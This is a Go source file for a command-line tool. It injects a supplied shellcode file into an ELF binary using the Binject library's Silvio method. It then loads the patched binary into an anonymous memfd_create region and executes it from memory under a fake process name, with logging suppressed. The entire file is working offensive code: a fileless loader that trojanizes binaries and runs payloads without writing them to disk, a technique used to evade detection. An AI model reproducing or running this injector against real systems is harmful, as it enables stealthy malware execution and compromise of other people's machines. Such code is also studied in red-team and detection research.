package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"

	"github.com/Binject/binjection/bj"
	"github.com/Binject/shellcode"
	"golang.org/x/sys/unix"
)

// BinjectConfig - Configuration Settings for the Binject modules
type BinjectConfig struct {
	CodeCaveMode    bool
	InjectionMethod int
	Repo            *shellcode.Repo
}

func injectAndRun(shellcodeFile string, sourceFile string, args []string) error {
	// Read in ELF and shellcode
	sourceBytes, err := ioutil.ReadFile(sourceFile)
	if err != nil {
		return err
	}
	shellcodeBytes, err := ioutil.ReadFile(shellcodeFile)
	if err != nil {
		return err
	}

	// Patch ELF and get bytes
	// Use the Silvio method (see README for details)
	config := &bj.BinjectConfig{InjectionMethod: bj.SilvioInject}
	log.SetOutput(ioutil.Discard)
	// Using a dodgy hack with flags to get rid of unwanted log output
	old_flags := log.Flags()
	log.SetFlags(0)
	patchedBytes, err := bj.ElfBinject(sourceBytes, shellcodeBytes, config)
	log.SetFlags(old_flags)
	if err != nil {
		return err
	}

	// Use memfd_create to create memory to load ELF into
	fd, err := unix.MemfdCreate("", 0)
	if err != nil {
		return err
	}

	// Write patched ELF into memfd memory
	fp := fmt.Sprintf("/proc/self/fd/%d", fd)
	f2 := os.NewFile(uintptr(fd), fp)
	if err != nil {
		return err
	}
	defer f2.Close()
	_, err = f2.Write(patchedBytes)
	if err != nil {
		return err
	}

	// Execute in-memory binary
	argv := []string{"from_injector"}
	argv = append(argv, args...)
	err = unix.Exec(fp, argv, os.Environ())

	return err
}

func main() {
	argc := len(os.Args)
	if argc < 3 {
		fmt.Printf("Usage: %s <shellcode> <binary> [arguments]\n", os.Args[0])
		return
	}
	shellFile := os.Args[1]
	srcFile := os.Args[2]
	args := os.Args[3:]

	err := injectAndRun(shellFile, srcFile, args)
	log.Println(err)
}
